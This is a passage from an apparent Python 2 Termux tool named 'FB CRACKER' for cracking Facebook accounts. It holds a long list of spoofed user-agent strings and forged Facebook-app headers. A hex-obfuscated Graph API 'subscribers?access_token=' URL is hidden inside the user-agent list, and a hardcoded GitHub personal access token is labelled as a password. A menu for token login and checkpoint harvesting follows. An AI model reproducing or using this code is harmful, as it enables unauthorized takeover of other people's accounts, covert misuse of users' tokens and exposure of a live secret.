  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokia-7.1-safari",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
]
				
header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

randomgents = random.choice(agents)
		
headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': randomgents, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])

try:
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
except requests.exceptions.ConnectionError:
	os.system("clear")
	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
	sys.exit()

# COLORS
x = '\33[m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
K = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

loop,cpc,okc = 0,0,0
	
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
CorrectUsername = "fbcracker"
CorrectPassword = "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"
	
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n\t ╔═══╗╔═══╗╔═══╗╔═╗╔═╗ \n\t ╚╗╔╗║║╔═╗║║╔══╝╚╗╚╝╔╝ \n\t  ║║║║║╚═╝║║╚══╗ ╚╗╔╝  \n\t  ║║║║║╔╗╔╝║╔══╝ ╔╝╚╗  \n\t ╔╝╚╝║║║║╚╗║╚══╗╔╝╔╗╚╗ \n\t ╚═══╝╚╝╚═╝╚═══╝╚═╝╚═╝ \n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { FB CRACKER }   ║\n    ║ AUTHOR   : Chidexzy         ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	


def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m      MAIN MENU\x1b[0m")
	print("")
	print("\033[92;1m  [1] LOGIN")
 	print("\033[92;1m  [2] CRACK FILE")
        print("\033[91;1m  [3] VIEW & SAVE CHECKPOINTS")
	print("\033[93;1m  [4] HOW TO GET ACCESS TOKEN")
	print("\033[94;1m  [5] UPDATE TOOL 06.10")
	print("\033[96;1m  [6] CHAT ME UP ON WHATSAPP \033[92;1m✘\033[91;1m✘")
        print("\033[90;1m  [0] EXIT")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
	if sel == "":
		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
		log_sel()
	elif sel =="1" or sel =="01":
		token()
	elif sel =="2" or sel =="02":
		xox("\033[92;1m\n Under Construction ❌🚫\n")
		main()
	elif sel =="3" or sel =="03":
		check_cps()
	elif sel =="4" or sel =="04":
		subprocess.check_output(["am", "start", "https://smashballoon.com/custom-facebook-feed/page-token/"])
		main()
	elif sel =="5" or sel =="05":
		import os
		try:
			os.system("rm -rf fbcracker.py ; git clone https://github.com/chidexzy/fbcracker ; cd fbcracker ; cp fbcracker.py /data/data/com.termux/files/home/fbcracker ; cd ; cd fbcracker ; rm -rf fbcracker")
			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL 👍\n")
			os.system("python2 fbcracker.py")
		except KeyboardInterrupt:
			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
	        	main()
	elif sel =="6" or sel =="06":
		subprocess.check_output(["am", "start", "https://wa.me/qr/BLRFNOUYDCRPO1"])
